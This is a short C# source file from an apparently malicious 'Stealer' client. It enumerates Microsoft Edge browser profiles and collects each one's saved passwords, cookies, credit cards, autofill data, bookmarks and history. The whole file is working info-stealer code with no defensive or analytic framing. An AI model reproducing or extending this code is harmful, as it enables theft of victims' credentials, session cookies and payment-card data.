using System.IO;
using System.Collections.Generic;
using System.Text;

namespace Client.Stealer.Edge
{
    internal sealed class Recovery : Browser
    {
        public Recovery() : base()
        {
            type = "Edge";
        }
        protected override void Load()
        {
            base.Load();
            string sFullPath = Paths.lappdata + Paths.EdgePath;
            foreach (string sProfile in Directory.GetDirectories(sFullPath))
            {
                if (File.Exists(sProfile + "\\Login Data"))
                {
                    // Run tasks
                    pCreditCards = Edge.CreditCards.Get(sProfile + "\\Web Data");
                    pAutoFill = Edge.Autofill.Get(sProfile + "\\Web Data");
                    pBookmarks = Edge.Bookmarks.Get(sProfile + "\\Bookmarks");
                    pPasswords = Chromium.Passwords.Get(sProfile + "\\Login Data");
                    pCookies = Chromium.Cookies.Get(sProfile + "\\Cookies");
                    pHistory = Chromium.History.Get(sProfile + "\\History");
                }
            }
        }
    }
}
